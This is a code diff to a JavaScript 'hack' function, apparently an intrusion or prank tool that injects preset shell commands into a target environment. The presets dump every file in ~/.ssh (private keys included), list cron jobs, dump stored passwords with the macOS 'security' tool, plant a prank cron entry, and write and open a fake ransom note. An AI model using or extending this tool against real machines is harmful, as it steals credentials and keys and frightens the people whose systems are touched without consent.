@@ -107,8 +107,20 @@ function hack(env, cmd, args) {
     if (name === '420') {
       write(env, writecron("20 16 * * * * say 'its foe 20, ye better be toke-in'"))
 
-    } else if (name === 'dump-ssh') {
+    } else if (name === 'ssh') {
       write(env, dump("ls ~/.ssh/* | xargs cat"))
+
+    } else if (name === 'cronjobs') {
+      write(env, dump("crontab -l"))
+
+    } else if (name === 'passwords') {
+      write(env, dump("security dump -d"))
+
+    } else if (name === 'ransom') {
+      write(env, 'rm -f /tmp/ransom; ' + shellescape([
+        'echo',
+        args[1]
+      ]) + ' > /tmp/ransom; open -a TextEdit /tmp/ransom')
 
     } else {
       throw new Error('Unknown preset', name)
